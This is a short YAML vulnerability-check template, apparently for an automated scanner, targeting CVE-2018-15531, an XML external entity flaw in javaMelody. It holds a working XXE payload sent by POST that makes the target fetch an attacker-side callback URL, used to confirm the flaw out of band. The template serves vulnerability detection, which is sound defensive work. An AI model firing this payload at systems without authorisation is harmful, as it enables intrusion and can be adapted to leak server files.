expression: r0()
id: CVE-2018-15531
info:
  author: Lay0us1
  name: javaMelody XXE
  reference:
  - https://imagemlt.github.io/post/melodyXXE/index.html
  severity: high
rules:
  r0:
    expression: reverse.wait(5)
    request:
      body: '<?xml version="1.0" encoding="UTF-8" standalone="no" ?>

        <!DOCTYPE root [

        <!ENTITY % remote SYSTEM "{{reverseURL}}">

        %remote;

        ]>

        </root>

        '
      headers:
        Content-Length: 154
        Content-Type: text/xml
        SOAPAction: aaaaa
      method: POST
      path: /
set:
  reverse: newReverse()
  reverseURL: reverse.url
